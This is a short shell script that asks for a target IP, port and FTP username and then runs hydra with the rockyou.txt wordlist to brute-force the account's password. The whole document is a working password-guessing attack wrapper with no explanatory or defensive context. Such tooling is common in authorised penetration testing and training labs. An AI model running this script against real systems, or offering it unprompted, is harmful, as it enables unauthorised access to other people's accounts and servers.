#!/bin/sh

echo "Enter Target IP: "

read TARGET

echo "Enter Port number: "

read PORT

echo "Enter FTP username: "

read UNAME

echo "TARGET: $TARGET"
echo "USERNAME: $UNAME"



hydra -V -l $UNAME -P "/usr/share/wordlists/rockyou.txt" $TARGET ftp -t 4 -s $PORT 
